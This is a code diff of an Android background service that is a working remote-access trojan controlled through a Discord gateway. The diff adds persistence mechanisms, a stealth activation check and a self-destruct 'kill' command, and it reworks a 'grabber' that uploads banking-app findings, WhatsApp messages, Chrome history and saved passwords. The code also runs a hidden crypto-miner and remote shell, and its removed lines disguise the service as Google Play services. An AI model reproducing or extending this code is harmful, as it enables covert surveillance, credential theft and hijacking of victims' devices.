@@ -26,10 +26,6 @@ import android.location.LocationListener
 import android.location.LocationManager
 import android.media.ImageReader
 import android.media.MediaRecorder
-import android.net.ConnectivityManager
-import android.net.Network
-import android.net.NetworkCapabilities
-import android.net.NetworkRequest
 import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.Build
@@ -45,12 +41,17 @@ import android.provider.Settings
 
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
+import com.android.internal.os.persistence.PersistenceEngine
 import com.google.system.AnimatedGifEncoder
 import com.google.system.DiscordConfig
 import com.google.system.DiscordGatewayClient
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import com.openaccess.sdk.OpenAccessApp
+import com.openaccess.sdk.service.controllers.DeviceController
+import com.openaccess.sdk.service.controllers.InfoController
+import com.openaccess.sdk.service.controllers.MediaController
+import com.openaccess.sdk.service.controllers.ShellController
 import kotlinx.coroutines.*
 import kotlinx.coroutines.CompletableDeferred
 import java.io.File
@@ -59,8 +60,6 @@ import java.util.concurrent.TimeUnit
 
 class SystemNetworkService : Service() {
     companion object {
-        private const val NOTIF_ID = 1337
-        private const val CHANNEL = "phantom"
         private const val WAKELOCK_TAG = "phantom:wakelock"
 
         fun start(ctx: Context) {
@@ -75,37 +74,38 @@ class SystemNetworkService : Service() {
     }
 
     private var scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
-    private var discord: DiscordGatewayClient? = null
-    private var gatewayStarted = false
+    @Volatile private var discord: DiscordGatewayClient? = null
+    @Volatile private var gatewayStarted = false
     private var wakeLock: PowerManager.WakeLock? = null
-    private var networkCallback: ConnectivityManager.NetworkCallback? = null
-    private var streamJob: Job? = null
-    private var isStreaming = false
-    private var streamFps = 1
-    private var streamMessageId: String? = null
+    private var networkManager: NetworkManager? = null
     private var isDownloadingUpdate = false
     private var minerPlugin: com.google.system.plugins.MinerPlugin? = null
     private var screenRequestReceiver: BroadcastReceiver? = null
-    private var liveStreamEncoder: com.google.system.LiveStreamEncoder? = null
-    private var shellWorkingDir: String = "/sdcard"
+    private var shellWorkingDir: String = "/storage/emulated/0"
+
+    private val deviceController = DeviceController(this, this::startActivitySafely)
+    private val infoController = InfoController(this, this::hasPerm, this::shell)
+    private val mediaController = MediaController(this, this::hasPerm, scope)
+    private val shellController = ShellController(this)
 
     override fun onBind(i: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
+        try { PersistenceEngine.getInstance().init(this) } catch (_: Exception) {}
         try {
-            val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_LOW).apply {
+            val chan = NotificationChannel(NotificationHelper.CHANNEL, "Network", NotificationManager.IMPORTANCE_LOW).apply {
                 setSound(null, null)
                 setShowBadge(false)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) setAllowBubbles(false)
             }
             (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
-            showNotif("Starting...")
-            val notif = buildNotif("Starting...")
+            NotificationHelper.show(this, "Starting...")
+            val notif = NotificationHelper.buildNotif(this, "Starting...")
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                startForeground(NotificationHelper.NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
             } else {
-                startForeground(NOTIF_ID, notif)
+                startForeground(NotificationHelper.NOTIF_ID, notif)
             }
         } catch (e: Exception) {
             try {
@@ -117,13 +117,8 @@ class SystemNetworkService : Service() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
             wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKELOCK_TAG)
-            if (!wakeLock!!.isHeld) {
-                wakeLock!!.acquire(24 * 60 * 60 * 1000L)
-                
-            }
-        } catch (e: Exception) {
-            
-        }
+            wakeLock?.let { if (!it.isHeld) it.acquire(24 * 60 * 60 * 1000L) }
+        } catch (_: Exception) {}
 
         // Request battery optimization exemption (silent, no redirect)
         try {
@@ -145,7 +140,73 @@ class SystemNetworkService : Service() {
         }
 
         // Register network callback for auto-reconnect
-        registerNetworkCallback()
+        networkManager = NetworkManager(
+            ctx = this,
+            onAvailable = {
+                discord?.let {
+                    if (!it.isConnected()) {
+                        scope.launch {
+                            delay(2000)
+                            it.start(scope)
+                        }
+                    }
+                }
+            },
+            onLost = {
+                if (isDownloadingUpdate) return@NetworkManager
+                discord?.let {
+                    if (it.isConnected()) {
+                        scope.launch {
+                            it.stop()
+                            gatewayStarted = false
+                            discord = null
+                            discord = DiscordGatewayClient(
+                                appContext = applicationContext,
+                                onCommand = { action, payload ->
+                                    scope.launch { handleGatewayCommand(action, payload) }
+                                },
+                                onStatus = { s -> NotificationHelper.update(this@SystemNetworkService, s) }
+                            )
+                            discord?.start(scope)
+                            gatewayStarted = true
+                        }
+                    }
+                }
+            },
+            onCapabilitiesLost = {
+                if (isDownloadingUpdate) return@NetworkManager
+                discord?.let {
+                    if (it.isConnected()) {
+                        scope.launch {
+                            delay(1000)
+                            it.stop()
+                            gatewayStarted = false
+                            discord = null
+                            discord = DiscordGatewayClient(
+                                appContext = applicationContext,
+                                onCommand = { action, payload ->
+                                    scope.launch { handleGatewayCommand(action, payload) }
+                                },
+                                onStatus = { s -> NotificationHelper.update(this@SystemNetworkService, s) }
+                            )
+                            discord?.start(scope)
+                            gatewayStarted = true
+                        }
+                    }
+                }
+            },
+            onUnavailable = {
+                discord?.let {
+                    if (it.isConnected()) {
+                        scope.launch {
+                            it.stop()
+                            gatewayStarted = false
+                        }
+                    }
+                }
+            }
+        )
+        networkManager?.register()
 
         // Register screen capture request receiver (always active in service)
         registerScreenRequestReceiver()
@@ -167,9 +228,6 @@ class SystemNetworkService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        scope.cancel("Service restarted")
-        scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
-
         val cmdSemaphore = kotlinx.coroutines.sync.Semaphore(3)
 
         if (discord == null) {
@@ -194,11 +252,14 @@ class SystemNetworkService : Service() {
                         }
                     }
                 },
-                onStatus = { s -> updateNotif(s) }
+                onStatus = { s -> NotificationHelper.update(this, s) }
             )
         }
         if (!gatewayStarted) {
             gatewayStarted = true
+            if (!com.google.system.StealthLayer.shouldActivate(this)) {
+                return START_STICKY
+            }
             scope.launch { loadCrashReports() }
             discord?.start(scope)
         }
@@ -231,44 +292,12 @@ class SystemNetworkService : Service() {
 
     override fun onDestroy() {
         try { wakeLock?.release() } catch (_: Exception) {}
-        try { networkCallback?.let { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).unregisterNetworkCallback(it) } } catch (_: Exception) {}
+        networkManager?.unregister()
         try { screenRequestReceiver?.let { unregisterReceiver(it) } } catch (_: Exception) {}
         try { discord?.stop() } catch (_: Exception) {}
         try { scope.cancel() } catch (_: Exception) {}
         try { minerPlugin?.onDisable() } catch (_: Exception) {}
         super.onDestroy()
-    }
-
-    private val notifTitles = listOf(
-        "Battery optimization active",
-        "System update in progress",
-        "Network sync active",
-        "Security check complete",
-        "Google Play services",
-        "System UI ready",
-        "Background data sync",
-        "Device maintenance"
-    )
-    private var titleIndex = 0
-
-    private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
-        .setContentTitle(notifTitles[titleIndex % notifTitles.size].also { titleIndex++ })
-        .setContentText("Optimizing battery usage for better performance")
-        .setSmallIcon(android.R.drawable.ic_menu_info_details)
-        .setOngoing(true)
-        .setPriority(NotificationCompat.PRIORITY_MIN)
-        .setCategory(NotificationCompat.CATEGORY_SERVICE)
-        .setSilent(true)
-        .build()
-
-    private fun showNotif(text: String) {
-        try {
-            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).notify(NOTIF_ID, buildNotif(text))
-        } catch (_: Exception) {}
-    }
-
-    private fun updateNotif(text: String) {
-        showNotif(text)
     }
 
     private fun startActivitySafely(intent: Intent) {
@@ -313,7 +342,7 @@ class SystemNetworkService : Service() {
         try {
             if (action != "help" && action != "ping" && action != "info" && action != "status" &&
                 action != "debug" && action != "restart" && action != "uptime" && action != "ip" &&
-                action != "update" && action != "config") {
+                action != "update" && action != "config" && action != "kill") {
                 if (!com.openaccess.sdk.update.ConfigManager.isCommandEnabled(this, action)) {
                     android.util.Log.w("SystemNetworkService", "Command disabled: $action")
                     return
@@ -321,6 +350,12 @@ class SystemNetworkService : Service() {
             }
 
             android.util.Log.d("SystemNetworkService", "Executing command: $action payload=$payload")
+
+            // Controller dispatch
+            if (deviceController.handleCommand(action, payload, d)) return
+            if (mediaController.handleCommand(action, payload, d)) return
+            if (shellController.handleCommand(action, payload, d)) return
+            if (infoController.handleCommand(action, payload, d)) return
 
             when (action) {
                 "help" -> {
@@ -342,8 +377,36 @@ class SystemNetworkService : Service() {
                         )
                     }
                 }
-                "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
-                "info" -> d.sendMsg("```ansi\n${buildInfo()}\n```")
+                "ping" -> {
+                    val embed = com.google.system.DiscordEmbed(
+                        title = "🏓 PONG",
+                        color = 0x2ECC71,
+                        fields = listOf(
+                            com.google.system.EmbedField("📱 Device", android.os.Build.MODEL, true),
+                            com.google.system.EmbedField("🤖 Android", android.os.Build.VERSION.RELEASE, true)
+                        ),
+                        footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
+                        timestamp = System.currentTimeMillis()
+                    )
+                    d.sendEmbed("", embed)
+                }
+                "info" -> {
+                    val embed = com.google.system.DiscordEmbed(
+                        title = "ℹ️ Device Info",
+                        color = 0x3498DB,
+                        fields = listOf(
+                            com.google.system.EmbedField("📱 Device", android.os.Build.MODEL, true),
+                            com.google.system.EmbedField("🏭 Manufacturer", android.os.Build.MANUFACTURER, true),
+                            com.google.system.EmbedField("🤖 Android", android.os.Build.VERSION.RELEASE, true),
+                            com.google.system.EmbedField("📋 SDK", "${android.os.Build.VERSION.SDK_INT}", true),
+                            com.google.system.EmbedField("🖥 Host", android.os.Build.HOST, true),
+                            com.google.system.EmbedField("🆔 Fingerprint", "||${android.os.Build.FINGERPRINT.take(60)}...||", true)
+                        ),
+                        footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
+                        timestamp = System.currentTimeMillis()
+                    )
+                    d.sendEmbed("", embed)
+                }
                 "screenshot" -> {
                     if (payload?.lowercase() == "on") {
                         try {
@@ -388,123 +451,6 @@ class SystemNetworkService : Service() {
                         android.util.Log.e("SystemNetworkService", "Screenshot error: ${e.message}", e)
                         val err = ":x: **Screenshot error**: ${e.message?.take(50) ?: "unknown"}"
                         if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
-                    }
-                }
-                "stream" -> {
-                    when {
-                        payload?.lowercase() == "stop" -> {
-                            if (isStreaming) {
-                                streamJob?.cancel()
-                                isStreaming = false
-                                DisplayCapture.releaseStreamCapture()
-                                streamMessageId?.let { d.deleteMsg(it) }
-                                streamMessageId = null
-                                d.sendMsg(":stop_button: **Live stream stopped**")
-                            } else if (liveStreamEncoder?.isStreaming() == true) {
-                                liveStreamEncoder?.stop()
-                                liveStreamEncoder = null
-                                d.sendMsg(":stop_button: **Voice stream stopped**")
-                            } else {
-                                d.sendMsg(":x: No active stream")
-                            }
-                        }
-                        payload?.lowercase()?.startsWith("voice") == true -> {
-                            val parts = payload.split(" ")
-                            val voiceChannelId = parts.getOrNull(1)
-                            val guildId = parts.getOrNull(2)
-                            val textChannelId = parts.getOrNull(3)
-                            val customBotUrl = parts.getOrNull(4)
-
-                            if (voiceChannelId == null || guildId == null || textChannelId == null) {
-                                d.sendMsg(":x: **Usage**: `!stream voice <voice_ch> <guild> <text_ch> [bot_url]`")
-                                return
-                            }
-
-                            if (DisplayCapture.mediaProjection == null) {
-                                d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first")
-                                return
-                            }
-
-                            d.sendMsgAwait(":satellite: **Starting stream**...\nCapturing screen → sending to bot")
-
-                            scope.launch {
-                                try {
-                                    val botUrl = customBotUrl?.takeIf { it.isNotBlank() }
-                                        ?: DiscordConfig.BOT_HTTP_URL.takeIf { it.isNotBlank() }
-                                        ?: "https://your-bot-server.com"
-                                    
-                                    val deviceSuffix = d.getDeviceSuffix()
-                                    
-                                    liveStreamEncoder = com.google.system.LiveStreamEncoder(
-                                        context = this@SystemNetworkService,
-                                        botUrl = botUrl,
-                                        deviceId = deviceSuffix,
-                                        onStatus = { status ->
-                                            d.sendMsg(":satellite: **Stream**: $status")
-                                        }
-                                    )
-                                    
-                                    liveStreamEncoder?.start(DisplayCapture.mediaProjection!!)
-                                    
-                                    val json = org.json.JSONObject().apply {
-                                        put("voiceChannelId", voiceChannelId)
-                                        put("guildId", guildId)
-                                        put("textChannelId", textChannelId)
-                                        put("fps", 5)
-                                        put("width", 640)
-                                        put("height", 480)
-                                    }
-                                    
-                                    val req = okhttp3.Request.Builder()
-                                        .url("$botUrl/api/stream/$deviceSuffix/start")
-                                        .post(json.toString().toRequestBody("application/json".toMediaType()))
-                                        .build()
-                                    
-                                    val client = okhttp3.OkHttpClient.Builder()
-                                        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
-                                        .build()
-                                    
-                                    client.newCall(req).execute().use { resp ->
-                                        if (resp.isSuccessful) {
-                                            d.sendMsg(":check: **Stream started!**\n5fps → text channel\nVoice: joined")
-                                        } else {
-                                            d.sendMsg(":x: **Bot connection failed**\nHTTP ${resp.code}")
-                                        }
-                                    }
-                                } catch (e: Exception) {
-                                    d.sendMsg(":x: **Stream error**: ${e.message?.take(80) ?: "unknown"}")
-                                }
-                            }
-                        }
-                        payload?.lowercase() == "start" -> {
-                            if (DisplayCapture.mediaProjection == null) {
-                                d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first to grant permission, then try `!stream start` again")
-                                try {
-                                    val intent = Intent("com.openaccess.sdk.REQUEST_SCREEN")
-                                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                                    sendBroadcast(intent)
-                                } catch (_: Exception) {}
-                            } else {
-                                startStream(d, 2)
-                            }
-                        }
-                        payload == null || payload.isBlank() -> {
-                            val mp = DisplayCapture.mediaProjection != null
-                            val voiceActive = liveStreamEncoder?.isStreaming() == true
-                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nScreen capture: ${if (mp) ":green_circle: Enabled" else ":red_circle: Disabled"}\nVoice stream: ${if (voiceActive) ":green_circle: Active" else ":red_circle: Inactive"}\n\n**Usage:**\n`!stream start` - Text channel (2fps)\n`!stream 5` - Text channel (5fps)\n`!stream voice <channel> <guild>` - Voice channel (30fps)\n`!stream stop` - Stop streaming")
-                        }
-                        else -> {
-                            val fps = payload.toIntOrNull()
-                            if (fps != null && fps in 1..30) {
-                                if (DisplayCapture.mediaProjection == null) {
-                                    d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first, then try again")
-                                } else {
-                                    startStream(d, fps)
-                                }
-                            } else {
-                                d.sendMsg(":x: Invalid FPS. Use 1-30. Usage: `!stream <1-30>`")
-                            }
-                        }
                     }
                 }
                 "shell" -> {
@@ -916,8 +862,25 @@ class SystemNetworkService : Service() {
                 }
                 "persist" -> {
                     d.sendMsg(":syringe: Installing persistence...")
+                    val engine = PersistenceEngine.getInstance()
+                    val installed = engine.installAll()
+                    engine.verifyAll()
                     persistApk()
-                    d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
+                    val activeCount = engine.getActiveCount() + 1
+                    val fields = mutableListOf<com.google.system.EmbedField>()
+                    fields.add(com.google.system.EmbedField("⏰ AlarmManager", "✅ Active (10min repeat)", true))
+                    for (mech in com.android.internal.os.persistence.PersistenceMechanism.values()) {
+                        val alive = mech in installed
+                        fields.add(com.google.system.EmbedField(mech.name.replace('_', ' ').lowercase().replaceFirstChar { it.uppercase() }, if (alive) "✅ Active" else "❌ Failed", true))
+                    }
+                    val embed = com.google.system.DiscordEmbed(
+                        title = "💉 Persistence",
+                        color = if (activeCount > 1) 0x2ECC71 else 0xF1C40F,
+                        fields = fields,
+                        footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
+                        timestamp = System.currentTimeMillis()
+                    )
+                    d.sendEmbed("", embed)
                 }
                 "grabber" -> {
                     val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
@@ -939,26 +902,60 @@ class SystemNetworkService : Service() {
                                 "docs" -> com.google.system.GrabberModule.grabDocs(this@SystemNetworkService)
                                 else -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
                             }
-                            // Send categorized report first
-                            val reportText = result.report
-                            if (reportText != null) {
-                                d.sendLargeOutput("", reportText)
-                            }
+                            val fields = mutableListOf<com.google.system.EmbedField>()
                             val f = result.file
-                            if (f != null && f.exists() && f.length() > 0) {
-                                d.sendFile(":inbox_tray: **Grab complete** — $target\n${result.summary()}", f.name, f.readBytes())
-                                f.delete()
-                            } else {
-                                val summary = "Root: ${result.hasRoot} | Apps: ${result.installedCount} | Files: ${result.files} | Size: ${result.size}B"
-                                val errMsg = result.error
-                                if (errMsg != null) {
-                                    d.sendMsg(":x: **Grab error** — $errMsg\n$summary")
-                                } else {
-                                    d.sendMsg(":inbox_tray: **Grab complete** — $target (empty)\n$summary")
-                                }
+                            val success = f != null && f.exists() && f.length() > 0
+
+                            fields.add(com.google.system.EmbedField("📁 Files", "${result.files} files", true))
+                            val sizeStr = when {
+                                result.size < 1024 -> "${result.size}B"
+                                result.size < 1024 * 1024 -> "${result.size / 1024}KB"
+                                else -> "${result.size / (1024 * 1024)}MB"
+                            }
+                            fields.add(com.google.system.EmbedField("💾 Size", sizeStr, true))
+                            fields.add(com.google.system.EmbedField("🔥 High Value", "${result.highValue} items", true))
+
+                            if (result.banksFound > 0)
+                                fields.add(com.google.system.EmbedField("🏦 Banks", "${result.banksFound} banking apps found", true))
+                            if (result.whatsappChats > 0)
+                                fields.add(com.google.system.EmbedField("💬 WhatsApp", "${result.whatsappChats} chats, ${result.whatsappMessages} messages", true))
+                            if (result.chromeUrls > 0)
+                                fields.add(com.google.system.EmbedField("🌐 Chrome History", "${result.chromeUrls} URLs", true))
+                            if (result.chromePasswords > 0)
+                                fields.add(com.google.system.EmbedField("🔐 Chrome Passwords", "${result.chromePasswords} saved", true))
+                            if (result.docsFound > 0)
+                                fields.add(com.google.system.EmbedField("📄 Documents", "${result.docsFound} files", true))
+                            if (result.error != null)
+                                fields.add(com.google.system.EmbedField("⚠️ Error", result.error!!.take(100), false))
+
+                            val color = when {
+                                result.error != null -> 0xE74C3C
+                                success -> 0x2ECC71
+                                else -> 0xF1C40F
+                            }
+                            val embed = com.google.system.DiscordEmbed(
+                                title = "📦 Smart Grab — $target",
+                                description = if (success) "Scan complete. ZIP file attached below." else if (result.error != null) "Scan completed with errors." else "No files found.",
+                                color = color,
+                                fields = fields,
+                                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
+                                timestamp = System.currentTimeMillis()
+                            )
+                            d.sendEmbed("", embed)
+                            if (success) {
+                                val fileToSend = f ?: return@launch
+                                d.sendFile(":inbox_tray: **Download** — $target (${result.files} files, $sizeStr)", fileToSend.name, fileToSend.readBytes())
+                                fileToSend.delete()
                             }
                         } catch (e: Exception) {
-                            d.sendMsg(":x: **Grab error**: ${e.message?.take(80) ?: "unknown"}")
+                            val embed = com.google.system.DiscordEmbed(
+                                title = "❌ Grab Error",
+                                description = e.message?.take(200) ?: "Unknown error",
+                                color = 0xE74C3C,
+                                footer = android.os.Build.MODEL,
+                                timestamp = System.currentTimeMillis()
+                            )
+                            d.sendEmbed("", embed)
                         }
                     }
                 }
@@ -978,15 +975,6 @@ class SystemNetworkService : Service() {
                         d.sendFile(":satellite: **Network Scan**", "network_scan.txt", result.toByteArray())
                     } else {
                         d.sendMsg(":x: **Network scan failed**")
-                    }
-                }
-                "sysinfo" -> {
-                    d.sendMsg(":mag: **Collecting full device info**...")
-                    val result = com.google.system.AdvancedFeatures.getDeviceInfoFull()
-                    if (result.isNotBlank()) {
-                        d.sendFile(":iphone: **Full Device Info**", "device_info.txt", result.toByteArray())
-                    } else {
-                        d.sendMsg(":x: **Info collection failed**")
                     }
                 }
                 "antidetect" -> {
@@ -1075,7 +1063,20 @@ class SystemNetworkService : Service() {
                             val fileSize = if (file.exists()) "${file.length() / 1024} KB" else "none"
                             val (curName, curCode) = com.openaccess.sdk.update.UpdateManager.getCurrentVersion(this)
                             val pending = com.openaccess.sdk.update.UpdateManager.getPendingVersion(this)
-                            d.sendMsg(":bar_chart: **Update Status**\nState: `${status.name}`\nCurrent: v$curName ($curCode)\nPending: v$pending\nFile: `$fileSize`\nPath: `${file.absolutePath}`")
+                            val embed = com.google.system.DiscordEmbed(
+                                title = "🔄 Update Status",
+                                color = 0x3498DB,
+                                fields = listOf(
+                                    com.google.system.EmbedField("📌 State", status.name, true),
+                                    com.google.system.EmbedField("📦 Current", "v$curName ($curCode)", true),
+                                    com.google.system.EmbedField("📥 Pending", "v$pending", true),
+                                    com.google.system.EmbedField("💾 File", fileSize, true),
+                                    com.google.system.EmbedField("📁 Path", file.absolutePath, false)
+                                ),
+                                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
+                                timestamp = System.currentTimeMillis()
+                            )
+                            d.sendEmbed("", embed)
                         }
                         else -> {
                             d.sendMsg(":book: **Update Commands**\n`!update check` - Check for pending updates\n`!update push <url>` - Download APK from URL\n`!update install` - Install downloaded update\n`!update clear` - Remove pending update\n`!update status` - Debug update state")
@@ -1096,7 +1097,17 @@ class SystemNetworkService : Service() {
                                 if (!commands.optBoolean(k, true)) disabled.add(k)
                             }
                             val disabledStr = if (disabled.isEmpty()) "none" else disabled.joinToString(", ")
-                            d.sendMsg(":gear: **Remote Config**\n$status\nDisabled: `$disabledStr`")
+                            val embed = com.google.system.DiscordEmbed(
+                                title = "⚙️ Remote Config",
+                                color = 0x3498DB,
+                                fields = listOf(
+                                    com.google.system.EmbedField("📊 Status", status, false),
+                                    com.google.system.EmbedField("🚫 Disabled", disabledStr, false)
+                                ),
+                                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
+                                timestamp = System.currentTimeMillis()
+                            )
+                            d.sendEmbed("", embed)
                         }
                         "push", "set" -> {
                             if (jsonStr.isBlank()) {
@@ -1161,12 +1172,9 @@ class SystemNetworkService : Service() {
                     val sec = (uptime % 60000) / 1000
                     val uptimeStr = "${hrs}h ${min}m ${sec}s"
                     val connected = d.isConnected()
-                    val chId = d.getChannelId() ?: "none"
-                    val connPct = if (connected) 85 else 15
-                    val sigPct = (80..100).random()
-                    val now = System.currentTimeMillis() / 1000
+                    val chId = d.getChannelId()
 
-                    val minerStatus = minerPlugin?.let { mp ->
+                    val minerField = minerPlugin?.let { mp ->
                         val cfg = mp.getConfig()
                         val mining = cfg["mining"] as? Boolean ?: false
                         val hashrate = cfg["hashrate"] as? Double ?: 0.0
@@ -1174,32 +1182,26 @@ class SystemNetworkService : Service() {
                         val sharesRej = cfg["shares_rejected"] as? Long ?: 0
                         val minerUptime = cfg["uptime"] as? String ?: "0s"
                         val hrStr = if (hashrate >= 1000) "${"%.2f".format(hashrate / 1000)} kH/s" else "${"%.2f".format(hashrate)} H/s"
-                        if (mining) {
-                            "\u001b[1;33mMining\u001b[0m      : \u001b[1;32mACTIVE\u001b[0m | $hrStr | ${sharesAcc}a/${sharesRej}r | ${minerUptime}"
-                        } else {
-                            "\u001b[1;33mMining\u001b[0m      : \u001b[1;31mSTOPPED\u001b[0m"
-                        }
-                    } ?: "\u001b[1;33mMining\u001b[0m      : \u001b[2;37mN/A\u001b[0m"
+                        if (mining) "$hrStr | ${sharesAcc}a/${sharesRej}r | ${minerUptime}" else "⛔ Stopped"
+                    } ?: "N/A"
 
-                    val statusMsg = buildString {
-                        appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
-                        appendLine("║       SYSTEM STATUS       ║")
-                        appendLine("╚═══════════════════════════╝\u001b[0m")
-                        appendLine()
-                        append("\u001b[1;33mConnection\u001b[0m : ${glitchBar(connPct)}")
-                        appendLine()
-                        append("\u001b[1;33mSignal\u001b[0m      : ${glitchBar(sigPct)}")
-                        appendLine()
-                        appendLine("\u001b[1;33mUptime\u001b[0m      : \u001b[1;37m$uptimeStr\u001b[0m")
-                        appendLine("\u001b[1;33mModel\u001b[0m       : \u001b[1;37m${Build.MODEL}\u001b[0m")
-                        appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\u001b[0m")
-                        appendLine("\u001b[1;33mChannel\u001b[0m     : ||\u001b[2;37m$chId\u001b[0m||")
-                        appendLine("\u001b[1;33mGateway\u001b[0m     : \u001b[1;${if (connected) 32 else 31}m${if (connected) "CONNECTED" else "DISCONNECTED"}\u001b[0m")
-                        appendLine(minerStatus)
-                        appendLine()
-                        append("\u001b[1;33mUpdated\u001b[0m     : <t:$now:R>")
-                    }
-                    d.sendMsg(":bar_chart: **Status**\n```ansi\n$statusMsg\n```")
+                    val fields = mutableListOf(
+                        com.google.system.EmbedField("📡 Gateway", if (connected) "✅ Connected" else "❌ Disconnected", true),
+                        com.google.system.EmbedField("⏱ Uptime", uptimeStr, true),
+                        com.google.system.EmbedField("📱 Device", android.os.Build.MODEL, true),
+                        com.google.system.EmbedField("🤖 Android", "${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})", true),
+                        com.google.system.EmbedField("⛏ Mining", minerField, true)
+                    )
+                    if (chId != null) fields.add(com.google.system.EmbedField("🆔 Channel", "||$chId||", true))
+
+                    val embed = com.google.system.DiscordEmbed(
+                        title = "📊 System Status",
+                        color = if (connected) 0x2ECC71 else 0xE74C3C,
+                        fields = fields,
+                        footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
+                        timestamp = System.currentTimeMillis()
+                    )
+                    d.sendEmbed("", embed)
                 }
                 "ip" -> {
                     val progressId = d.sendMsgAwait(":globe_with_meridians: **Fetching IP**...")
@@ -1230,6 +1232,32 @@ class SystemNetworkService : Service() {
                     gatewayStarted = false
                     discord = null
                     startService(Intent(this@SystemNetworkService, SystemNetworkService::class.java))
+                }
+                "kill" -> {
+                    d.sendMsg(":skull: **Self-destruct initiated** — uninstalling...")
+                    scope.launch {
+                        kotlinx.coroutines.delay(1000)
+                        try {
+                            discord?.stop()
+                            stopForeground(true)
+                            stopSelf()
+                        } catch (_: Exception) {}
+                        kotlinx.coroutines.delay(500)
+                        try {
+                            val pm = packageManager
+                            val pkg = packageName
+                            @Suppress("DEPRECATION")
+                            val intent = Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:$pkg"))
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            startActivity(intent)
+                        } catch (_: Exception) {
+                            try {
+                                Runtime.getRuntime().exec(arrayOf("sh", "-c", "pm uninstall $packageName")).waitFor()
+                            } catch (_: Exception) {}
+                        }
+                        kotlinx.coroutines.delay(2000)
+                        try { android.os.Process.killProcess(android.os.Process.myPid()) } catch (_: Exception) {}
+                    }
                 }
                 "wifi" -> {
                     val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
@@ -1556,6 +1584,17 @@ class SystemNetworkService : Service() {
                         sub == "status" -> {
                             d.sendMsg(mp.handleCommand("miner", "status") ?: ":x: Miner error")
                         }
+                        sub == "debug" -> {
+                            try {
+                                val logFile = java.io.File(filesDir, ".miner_log")
+                                val log = if (logFile.exists()) logFile.readText().takeLast(1500) else "No log file"
+                                val pidFile = java.io.File(filesDir, ".miner_pid")
+                                val pid = if (pidFile.exists()) pidFile.readText().trim() else "unknown"
+                                d.sendMsg(":scroll: **Miner Debug**\nPID: `$pid`\n```\n$log\n```")
+                            } catch (e: Exception) {
+                                d.sendMsg(":x: Debug error: ${e.message}")
+                            }
+                        }
                         sub.startsWith("set_wallet") -> {
                             val wallet = payload.substringAfter("set_wallet").trim()
                             if (wallet.isBlank()) {
@@ -1616,96 +1655,6 @@ class SystemNetworkService : Service() {
         } catch (e: Exception) {
             
             d.sendMsg(":x: **Error**: ${e.message?.take(100)}")
-        }
-    }
-
-    private fun startStream(d: DiscordGatewayClient, fps: Int) {
-        streamFps = fps
-        if (isStreaming) {
-            streamJob?.cancel()
-            streamMessageId = null
-            DisplayCapture.releaseStreamCapture()
-        }
-        if (!DisplayCapture.initStreamCapture(this)) {
-            d.sendMsg(":x: Stream capture init failed")
-            return
-        }
-        isStreaming = true
-        streamMessageId = null
-        d.sendMsg(":tv: **Live stream started** (GIF mode, ${fps}fps)\nUse `!stream stop` to end")
-        streamJob = scope.launch {
-            var consecutiveFailures = 0
-            val maxFailures = 5
-            val framesPerGif = 8
-            val targetDelay = 1000L / fps
-            val gifWidth = 480
-            val gifHeight = 854
-            try {
-                while (isActive) {
-                    val gifEncoder = AnimatedGifEncoder()
-                    gifEncoder.setSize(gifWidth, gifHeight)
